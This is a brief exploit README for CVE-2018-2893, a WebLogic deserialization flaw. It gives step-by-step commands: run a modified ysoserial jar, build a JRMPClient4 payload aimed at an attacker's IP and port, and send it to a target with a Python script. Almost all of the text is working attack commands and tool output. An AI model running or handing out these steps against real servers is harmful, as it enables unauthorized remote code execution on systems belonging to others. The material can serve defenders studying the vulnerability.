# CVE-2018-2893

## Step 1

`java -jar ysoserial-cve-2018-2893.jar`

```
WHY SO SERIAL?
Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]'
Available payload types:
     Payload     Authors   Dependencies
     -------     -------   ------------
     JRMPClient  @mbechler
     JRMPClient2 @pynerd
     JRMPClient3 @pynerd
     JRMPClient4 @pynerd
     Jdk7u21     @frohoff
```

## Step 2

`java -jar ysoserial-cve-2018-2893.jar  JRMPClient4 "<ip>:<port>" > poc4.ser`

## Step 3

`python weblogic.py <host> <port> poc4.ser`

